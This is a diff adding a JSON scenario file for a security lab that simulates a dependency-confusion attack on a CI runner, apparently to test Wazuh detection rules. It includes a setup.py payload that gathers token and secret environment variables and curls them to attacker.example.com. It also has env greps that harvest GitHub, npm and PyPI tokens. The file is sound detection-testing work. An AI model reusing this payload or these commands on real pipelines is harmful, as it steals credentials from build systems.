@@ -1,0 +1,131 @@
+{
+  "id": "S9-02",
+  "name": "Dependency Confusion Token Theft",
+  "category": "Supply Chain",
+  "version": "1.0",
+  "description": "Attacker publishes a malicious package to a public registry with the same name as an internal package, causing the CI/CD pipeline to install the malicious version which steals tokens during install",
+  "difficulty": "Hard",
+  "real_world_relevance": "Alex Birsan's dependency confusion research (2021) affecting Apple, Microsoft, PayPal; ua-parser-js npm hijack (2021); event-stream supply chain attack (2018)",
+
+  "mitre_attack": {
+    "tactics": ["Initial Access", "Credential Access"],
+    "techniques": [
+      {"id": "T1195.001", "name": "Supply Chain Compromise: Compromise Software Dependencies and Development Tools"},
+      {"id": "T1552", "name": "Unsecured Credentials"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["cicd-runner", "mock-cicd"],
+    "network": "cloud_net",
+    "profile": "cicd"
+  },
+
+  "attack_flow": {
+    "description": "Attacker exploits package manager resolution to inject malicious code that runs during installation and exfiltrates CI/CD tokens",
+    "diagram": [
+      "1. Attacker identifies internal package name from public references",
+      "2. Publishes higher-version malicious package to public registry",
+      "3. CI/CD pipeline runs 'npm install' or 'pip install'",
+      "4. Package manager resolves public malicious package (higher version wins)",
+      "5. Malicious postinstall script harvests CI tokens and secrets",
+      "6. Stolen credentials exfiltrated to attacker C2"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "Internal Package Discovery",
+      "description": "Identify internal package names from public sources",
+      "critical": false,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "cat /runner/_work/package.json 2>/dev/null | python3 -c 'import sys,json; d=json.load(sys.stdin); [print(k) for k in d.get(\"dependencies\",{})]' 2>/dev/null || echo 'No package.json found'",
+          "description": "Enumerate package dependencies"
+        },
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "cat /runner/_work/requirements.txt 2>/dev/null || cat /runner/_work/Pipfile 2>/dev/null || echo 'No Python deps found'",
+          "description": "Check Python package dependencies"
+        }
+      ]
+    },
+    {
+      "name": "Malicious Package Simulation",
+      "description": "Simulate installation of a dependency-confusion package that steals tokens",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "mkdir -p /tmp/malicious-pkg && cat > /tmp/malicious-pkg/setup.py << 'EVIL'\nimport os, subprocess\ndef exfil():\n    tokens = {k:v for k,v in os.environ.items() if any(s in k.upper() for s in ['TOKEN','SECRET','KEY','PASSWORD'])}\n    subprocess.run(['curl', '-s', '-d', str(tokens), 'http://attacker.example.com/exfil'])\nexfil()\nEVIL\necho 'Malicious package payload created'",
+          "description": "Create simulated malicious package with token theft payload"
+        },
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "env | grep -iE 'TOKEN|SECRET|KEY|NPM|PIP|PYPI' 2>/dev/null || echo 'Checking for package manager tokens'",
+          "description": "Verify CI/CD tokens accessible during package install"
+        }
+      ]
+    },
+    {
+      "name": "Token Exfiltration",
+      "description": "Simulate the credential exfiltration that occurs during malicious package install",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "env | grep -iE 'GITHUB_TOKEN|ACTIONS_RUNTIME_TOKEN|NPM_TOKEN|PYPI_TOKEN|CI_JOB_TOKEN' 2>/dev/null || echo 'No CI tokens found'",
+          "description": "Extract CI/CD tokens that would be stolen during install"
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "CI/CD Logs",
+      "description": "Dependency installation with credential access patterns",
+      "wazuh_rule": "100982"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "100982",
+      "level": 13,
+      "description": "NHI: Dependency installation with credential access"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Rotate all CI/CD tokens and secrets exposed during the incident",
+      "Audit package installation logs for unexpected packages",
+      "Remove the malicious package from the build cache"
+    ],
+    "long_term": [
+      "Configure private registry priority (npm: registry scope, pip: --index-url)",
+      "Use package lockfiles (package-lock.json, Pipfile.lock) with integrity hashes",
+      "Implement package allowlisting in CI/CD pipelines",
+      "Use tools like Socket.dev or Snyk to detect suspicious package behavior",
+      "Register internal package names on public registries (defensive squatting)"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "Dependency Confusion - Alex Birsan",
+      "url": "https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610"
+    },
+    {
+      "title": "npm Security Best Practices",
+      "url": "https://docs.npmjs.com/packages-and-modules/introduction-to-packages-and-scopes"
+    }
+  ]
+}
